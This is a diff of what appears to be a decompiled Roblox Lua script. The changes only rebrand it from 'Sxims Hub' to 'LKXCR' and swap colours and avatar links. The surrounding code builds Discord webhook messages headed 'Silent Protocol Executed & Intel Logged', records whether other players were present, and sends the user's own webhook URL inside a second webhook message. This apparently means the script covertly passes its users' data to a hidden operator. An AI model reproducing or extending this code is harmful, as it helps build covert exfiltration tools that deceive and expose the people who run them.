@@ -791,7 +791,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                 end)();
                 local v110 = #l_Players_0:GetPlayers() > 1 and "\226\154\160\239\184\143 **Warning:** Other players were detected!" or "\226\156\133 **Server Status:** User was alone.";
                 local v111 = {
-                    color = 0, 
+                    color = 12781311, 
                     title = "Silent Protocol Executed & Intel Logged", 
                     fields = {
                         {
@@ -816,7 +816,7 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                         }
                     }, 
                     footer = {
-                        text = "Logged via Sxims Hub Auto Moreira"
+                        text = "Logged via LKXCR Auto Moreira"
                     }
                 };
                 local v112 = "";
@@ -825,8 +825,8 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                 end;
                 local v113 = {
                     content = v112, 
-                    username = "Sxims Hub Auto Morira", 
-                    avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
+                    username = "LKXCR Auto Morira", 
+                    avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS80n2maY8OkKsZCpLKJHQlVQlKtorwKMvd6w&s", 
                     embeds = {
                         v111
                     }
@@ -849,8 +849,8 @@ v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
                         end;
                         local v119 = {
                             content = l_UserWebhookURL_0, 
-                            username = "Skims Hub Auto Moriera", 
-                            avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
+                            username = "LKXCR Auto Moriera", 
+                            avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS80n2maY8OkKsZCpLKJHQlVQlKtorwKMvd6w&s", 
                             embeds = {
                                 v111
                             }
